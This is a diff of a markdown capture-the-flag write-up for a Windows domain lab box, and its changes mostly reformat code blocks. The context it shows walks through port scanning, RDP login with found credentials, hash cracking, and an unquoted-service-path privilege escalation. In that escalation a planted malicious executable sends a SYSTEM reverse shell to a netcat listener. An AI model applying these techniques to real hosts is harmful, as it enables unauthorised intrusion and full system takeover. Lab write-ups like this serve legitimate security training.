@@ -46,6 +46,9 @@ PORT      STATE SERVICE
 49847/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 29.62 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3389,5985,7990,9389,47001,49664-49669,49672-49674,49678,49697,49704,4984
 7
@@ -120,6 +123,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 73.53 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10                                               
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-31 21:26 UTC
@@ -199,6 +205,9 @@ Progress: 4746 / 4747 (99.98%)
 ===============================================================
 Finished
 ===============================================================
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ feroxbuster -u <http://$IP>
                                                                                                                                           
@@ -369,7 +378,7 @@ xfreerdp3 /v:$IP /u:bitbucket /p:littleredbucket /dynamic-resolution
 
 ![image-20260201013717793](./enterprise.assets/image-20260201013717793.png)
 
-```bash
+```cmd
 C:\\Users\\bitbucket>net localgroup "Remote Desktop Users"
 Alias name     Remote Desktop Users
 Comment        Members in this group are granted the right to logon remotely
@@ -383,7 +392,7 @@ The command completed successfully.
 
 Found `user.txt`
 
-```bash
+```cmd
 C:\\Users\\bitbucket\\Desktop>type user.txt
 THM{ed8...
 ```
@@ -392,7 +401,7 @@ THM{ed8...
 
 `whoami /priv` showed that the account held `SeAssignPrimaryTokenPrivilege` . I attempted to escalate privileges using GodPotato, but the exploit failed with a `Win32Error: 1314` .
 
-```bash
+```cmd
 C:\\Users\\bitbucket\\Desktop>whoami /priv
 
 PRIVILEGES INFORMATION
@@ -433,7 +442,7 @@ C:\\Users\\bitbucket\\Desktop>.\\GodPotato-NET4.exe -cmd "whoami"
 
 While exploring the target host, I discovered two Office documents in `C:\\WorkShare` . Both files were password-protected. I extracted the hashes using `office2john` , but the cracking process was not yielding immediate results so I decided to move on to other enumeration methods.
 
-```bash
+```cmd
 C:\\WorkShare>dir
  Volume in drive C has no label.
  Volume Serial Number is 7CD9-A0AE
@@ -453,7 +462,9 @@ C:\\WorkShare>dir
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ office2john RSA-Secured-Credentials.xlsx > rsa1hash.txt 
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ john rsa1hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -474,7 +485,7 @@ BloodHound enumeration was performed to map out potential privilege escalation v
 
 I executed `PrivescCheck.ps1` for automated analysis. The tool identified several high-risk vectors, with the most prominent being an Unquoted Service Path vulnerability.
 
-```bash
+```powershell
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃                 ~~~ PrivescCheck Summary ~~~                 ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
@@ -513,7 +524,7 @@ Permissions       : AddFile, AddSubdirectory, WriteExtendedAttributes, WriteAttr
 
 Manual verification with `icacls` and `accesschk` confirmed that the current session has write access to the `C:\\Program Files (x86)\\Zero Tier` directory.
 
-```bash
+```cmd
 C:\\Users\\bitbucket\\Desktop>icacls "C:\\Program Files (x86)\\Zero Tier"
 C:\\Program Files (x86)\\Zero Tier BUILTIN\\Users:(OI)(CI)(W)
                                  NT SERVICE\\TrustedInstaller:(I)(F)
@@ -555,7 +566,7 @@ RW C:\\Program Files (x86)\\Zero Tier
 
 I also confirmed that the current user can restart the service to trigger the exploit.
 
-```bash
+```cmd
 C:\\Users\\bitbucket\\Desktop>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -585,13 +596,16 @@ I transferred the payload to the target machine and placed it within the `C:\\Pr
 
 Upon restarting the service, the Windows executed my malicious `Zero.exe` binary, which triggered reverse shell callback to my listener, granting me a shell with `SYSTEM` privileges.
 
-```bash
+```powershell
 PS C:\\Users\\bitbucket\\Desktop> net stop zerotieroneservice
 The zerotieroneservice service is not started.
 
 More help is available by typing NET HELPMSG 3521.
 
 PS C:\\Users\\bitbucket\\Desktop> net start zerotieroneservice
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ rlwrap nc -lvnp 80              
 listening on [any] 80 ...
@@ -606,7 +620,7 @@ nt authority\\system
 
 Found `root.txt`
 
-```bash
+```cmd
 C:\\Users\\Administrator\\Desktop>dir
 dir
  Volume in drive C has no label.
